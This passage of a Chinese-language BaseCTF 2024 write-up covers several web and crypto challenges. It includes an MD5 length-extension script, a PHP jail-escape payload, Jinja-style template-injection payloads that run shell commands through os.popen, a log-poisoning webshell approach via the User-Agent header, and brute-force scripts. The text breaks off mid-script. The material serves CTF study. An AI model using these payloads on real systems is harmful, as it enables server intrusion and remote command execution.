8%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;banananana=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2<br></code></pre></td></tr></table></figure>
<p>最后一层已知$random的MD5值，可以控制name和md5的值，求等式进行绕过，通过了解知道是MD5长度拓展攻击</p>
<p>先前一直在找hashpump的一直不好用现在贴一个比较好用的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor, sin<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">MD5 Extension Attack</span><br><span class="hljs-string">====================</span><br><span class="hljs-string"></span><br><span class="hljs-string">@refs</span><br><span class="hljs-string">https://github.com/shellfeel/hash-ext-attack</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D = \<br>            (<span class="hljs-number">0x67452301</span>, <span class="hljs-number">0xefcdab89</span>, <span class="hljs-number">0x98badcfe</span>, <span class="hljs-number">0x10325476</span>)  <span class="hljs-comment"># initial values</span><br>        <span class="hljs-variable language_">self</span>.r: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">5</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>] * <span class="hljs-number">4</span> + \<br>            [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>] * <span class="hljs-number">4</span>  <span class="hljs-comment"># shift values</span><br>        <span class="hljs-variable language_">self</span>.k: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [floor(<span class="hljs-built_in">abs</span>(sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]  <span class="hljs-comment"># constants</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_lrot</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># left rotate</span><br>        <span class="hljs-keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="hljs-number">32</span> - n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, chunk: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># update the hash for a chunk of data (64 bytes)</span><br>        w = <span class="hljs-built_in">list</span>(unpack(<span class="hljs-string">&#x27;&lt;&#x27;</span>+<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>, chunk))<br>        a, b, c, d = <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                f = (b &amp; c) | ((~b) &amp; d)<br>                flag = i<br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">32</span>:<br>                f = (b &amp; d) | (c &amp; (~d))<br>                flag = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">48</span>:<br>                f = (b ^ c ^ d)<br>                flag = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">else</span>:<br>                f = c ^ (b | (~d))<br>                flag = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span><br><br>            tmp = b + \<br>                <span class="hljs-variable language_">self</span>._lrot((a + f + <span class="hljs-variable language_">self</span>.k[i] + w[flag])<br>                           &amp; <span class="hljs-number">0xffffffff</span>, <span class="hljs-variable language_">self</span>.r[i])<br>            a, b, c, d = d, tmp &amp; <span class="hljs-number">0xffffffff</span>, b, c<br><br>        <span class="hljs-variable language_">self</span>.A = (<span class="hljs-variable language_">self</span>.A + a) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.B = (<span class="hljs-variable language_">self</span>.B + b) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.C = (<span class="hljs-variable language_">self</span>.C + c) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-variable language_">self</span>.D = (<span class="hljs-variable language_">self</span>.D + d) &amp; <span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># extend the hash with a new message (padded)</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> == <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-number">64</span>):<br>            <span class="hljs-variable language_">self</span>.update(msg[i:i + <span class="hljs-number">64</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># pad the message</span><br>        length = pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-built_in">len</span>(msg) * <span class="hljs-number">8</span>)<br><br>        msg += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        msg += <span class="hljs-string">b&#x27;\x00&#x27;</span> * ((<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(msg)) % <span class="hljs-number">64</span>)<br>        msg += length<br><br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># return the hash</span><br>        <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, <span class="hljs-variable language_">self</span>.A, <span class="hljs-variable language_">self</span>.B, <span class="hljs-variable language_">self</span>.C, <span class="hljs-variable language_">self</span>.D)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">test_string: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># (DEBUG function) verify the MD5 implementation</span><br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5 <span class="hljs-keyword">as</span> md5_hashlib<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_manual</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        md5 = MD5()<br>        md5.extend(md5.padding(msg))<br>        <span class="hljs-keyword">return</span> md5.digest()<br><br>    manual_result = md5_manual(test_string).<span class="hljs-built_in">hex</span>()<br>    hashlib_result = md5_hashlib(test_string).hexdigest()<br><br>    <span class="hljs-keyword">assert</span> manual_result == hashlib_result, <span class="hljs-string">&quot;Test failed!&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">message_len: <span class="hljs-built_in">int</span>, known_hash: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">           append_str: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>    <span class="hljs-comment"># MD5 extension attack</span><br>    md5 = MD5()<br><br>    previous_text = md5.padding(<span class="hljs-string">b&quot;*&quot;</span> * message_len)<br>    current_text = previous_text + append_str<br><br>    md5.A, md5.B, md5.C, md5.D = unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(known_hash))<br>    md5.extend(md5.padding(current_text)[<span class="hljs-built_in">len</span>(previous_text):])<br><br>    <span class="hljs-keyword">return</span> current_text[message_len:], md5.digest().<span class="hljs-built_in">hex</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    message_len = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known text length: &quot;</span>))<br>    known_hash = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known hash: &quot;</span>).strip()<br>    append_text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attacking...&quot;</span>)<br><br>    extend_str, final_hash = attack(message_len, known_hash, append_text)<br><br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text:&quot;</span>, extend_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Final hash:&quot;</span>, final_hash)<br></code></pre></td></tr></table></figure>
<p>通过对源码的分析得知random的长度应该是96</p>
<p><img src="/../../images/basectf/basectf2024/dongmd5.png" srcset="/img/loading.gif" lazyload alt="dongmd5"></p>
<p>然后填入就好了</p>
<p><img src="/../../images/basectf/basectf2024/dongmd51.png" srcset="/img/loading.gif" lazyload alt="dongmd51"></p>
<h1 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h1>
<h2 id="web-3"><a class="markdownIt-Anchor" href="#web-3"></a> web</h2>
<h3 id="ez_php_jail"><a class="markdownIt-Anchor" href="#ez_php_jail"></a> ez_php_jail</h3>
<p>这题搜一下其实挺有意思的，应该是从这篇文章进行微调出的题目,<a target="_blank" rel="noopener" href="https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/">ringzer0 CTF - Jail Escaping PHP</a>,具体应该是对应level4的那个题目</p>
<p>打开查看源码进行base64解密，进入可以查看phpinfo(),得到了php版本是7.4,以及一些disable_functions</p>
<p>直接利用文章构造payload,其外根据php特性，在php小于8的情况下<code>_</code>是直接转化成<code>.</code>可以利用<code>[</code>进行绕过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?Jail[by.Happy=highlight_file(glob(<span class="hljs-string">&quot;/f*&quot;</span>)[0]);<br></code></pre></td></tr></table></figure>
<h3 id="复读机"><a class="markdownIt-Anchor" href="#复读机"></a> 复读机</h3>
<p>有过滤的，手测一下</p>
<p><code>&#123;&#123;`  `+`  `-`  `*`  `&#125;&#125;</code>  <code>&quot;</code>  <code>:</code>  <code>\</code>  <code>/</code>  <code>__</code>  <code>.</code>,接下来就是正常的RCE就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>])%&#125;<br></code></pre></td></tr></table></figure>
<p>可以利用<code>BaseCTF&lt;class 'os._wrap_close'&gt;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_gl&#x27;</span><span class="hljs-string">&#x27;obals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;env&#x27;</span>)[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure>
<p>看看环境，已知不能使用<code>/</code>,可以切换根目录再读取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">BaseCTF&#123;%<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>[<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_cla&#x27;</span><span class="hljs-string">&#x27;ss_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_m&#x27;</span><span class="hljs-string">&#x27;ro_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_subcl&#x27;</span><span class="hljs-string">&#x27;asses_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>]()[<span class="hljs-number">137</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_in&#x27;</span><span class="hljs-string">&#x27;it_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-string">&#x27;_gl&#x27;</span><span class="hljs-string">&#x27;obals_&#x27;</span><span class="hljs-string">&#x27;_&#x27;</span>][<span class="hljs-string">&#x27;po&#x27;</span><span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;cd $OLDPWD;cat flag&#x27;</span>)[<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure>
<h3 id="滤个不停"><a class="markdownIt-Anchor" href="#滤个不停"></a> 滤个不停</h3>
<p>这题和ctfshow的web4基本差不多，一开始我以为要从伪协议入手，还是要求的是服务器日志，用的是Nginx，存放在/var/log/nginx/access.log里面，让Datch赋值这个，然后在UA头里写马就行了</p>
<p><img src="/../../images/basectf/basectf2024/%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C.png" srcset="/img/loading.gif" lazyload alt="滤个不停"></p>
<h3 id="玩原神玩的"><a class="markdownIt-Anchor" href="#玩原神玩的"></a> 玩原神玩的</h3>
<p>这题其实还是能研究很多的，我写代码的能力一直挺一般的，这个还是稍微考究一些</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;len&#x27;</span>]) == <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>)) &#123;<br> <span class="hljs-title function_ invoke__">ys_open</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tip&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ys_open</span>(<span class="hljs-params"><span class="hljs-variable">$tip</span></span>) </span>&#123;<br> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$tip</span> != <span class="hljs-string">&quot;我要玩原神&quot;</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);<br> &#125;<br> <span class="hljs-title function_ invoke__">dumpFlag</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dumpFlag</span>(<span class="hljs-params"></span>) </span>&#123;<br> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) || <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) != <span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;可恶的QQ人！😡😡😡&quot;</span>);<br> &#125;<br> <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">0</span>];<br> <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;m&#x27;</span>][<span class="hljs-number">1</span>];<br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$a</span>) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$b</span>) || <span class="hljs-variable">$a</span> != <span class="hljs-string">&quot;100%&quot;</span> || <span class="hljs-variable">$b</span> != <span class="hljs-string">&quot;love100%&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>)) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);<br> &#125;<br> <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br> <span class="hljs-variable">$flag</span>[] = <span class="hljs-keyword">array</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$ii</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$ii</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$array</span>);<span class="hljs-variable">$ii</span>++) &#123;<br>  <span class="hljs-variable">$flag</span>[<span class="hljs-variable">$ii</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$array</span>[<span class="hljs-variable">$ii</span>]) ^ <span class="hljs-variable">$ii</span>);<br> &#125;<br> <br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$flag</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>先看第一层写脚本爆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:23955/&#x27;</span><br><br>ans = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>    payload = &#123;<span class="hljs-string">f&#x27;len[<span class="hljs-subst">&#123;j&#125;</span>]&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i)&#125;<br>    response = requests.post(url, data=payload)<br>    <span class="hljs-built_in">print</span>(response.text.splitlines()[-<span class="hljs-number">1</span>])<br>    last_line = response.text.splitlines()[-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;我不管，我要玩原神！😭😭😭&quot;</span> <span class="hljs-keyword">in</span> last_line:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Success with <span class="hljs-subst">&#123;i&#125;</span> parameters!&#x27;</span>)<br>        ans = i<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">if</span> ans:<br>    payload_str = <span class="hljs-string">&#x27;&amp;&#x27;</span>.join([<span class="hljs-string">f&#x27;len[<span class="hljs-subst">&#123;j&#125;</span>]=0&#x27;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ans)])<br>    <span class="hljs-built_in">print</span>(payload_str)<br></code></pre></td></tr></table></figure>
<p>第二层输入<code>?tip=我要玩原神</code></p>
<p>第三层直接输入需要url编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966<br></code></pre></td></tr></table></figure>
<p>最后一层</p>
<ol>
<li><strong>已知每个加密字符串 <code>enc[i]</code> 是由字符的 ASCII 值和索引 <code>i</code> 异或后的结果再进行 <code>md5</code> 哈希得到的</strong>。</li>
<li><strong>通过暴力破解的方法</strong>：
<ul>
<li>对每个加密的哈希值 <code>enc[i]</code>，尝试所有可能的字符（ASCII值从0到126）。</li>
<li>计算这些字符与其索引 <code>i</code> 异或后的值，并对该值进行 <code>md5</code> 哈希。</li>
<li>如果哈希结果与 <code>enc[i]</code> 相同，说明找到了正确的字符。</li>
</ul>
</li>
<li><strong>最终结果是解密后的字符串 <code>flag</code></strong>。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>enc = [<br>    <span class="hljs-string">&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;</span>, <span class="hljs-string">&quot;26657d5ff9020d2abefe558796b99584&quot;</span>,<br>    <span 